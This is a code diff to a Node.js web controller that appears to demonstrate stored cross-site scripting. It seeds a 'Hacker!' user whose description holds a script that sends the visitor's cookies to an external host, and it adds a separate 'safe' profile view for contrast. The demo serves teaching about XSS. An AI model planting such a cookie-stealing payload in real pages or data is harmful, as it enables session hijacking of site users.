@@ -14,10 +14,12 @@ module.exports = {
     User.count().exec(function(err, count){
       if (err) return res.negotiate(err);
 
+      var badStuff = "<script>document.write('<img src=\"https://badsite.herokuapp.com/collect.gif?cookie=\'+encodeURI(document.cookie)+\'\" />')</script>"
+
       if (count < 1) {
         User.create({
           name: 'Hacker!',
-          description: "<script>alert('a')</script>"
+          description: badStuff
         }).exec(function(err, createdUser){
           if (err) return negotiate(err);
 
@@ -47,6 +49,25 @@ module.exports = {
       };
 
       return res.view('profile', {
+        name: foundUser.name,
+        description: foundUser.description
+      });
+    });
+  },
+
+  showProfileSafe: function(req, res){
+    User.findOne({
+      name: 'Hacker!'
+    }).exec(function(err, foundUser){
+      if (err) return res.negotiate(err);
+
+      if (!foundUser) {
+        return res.view('profile-safe', {
+          name: null
+        });
+      };
+
+      return res.view('profile-safe', {
         name: foundUser.name,
         description: foundUser.description
       });
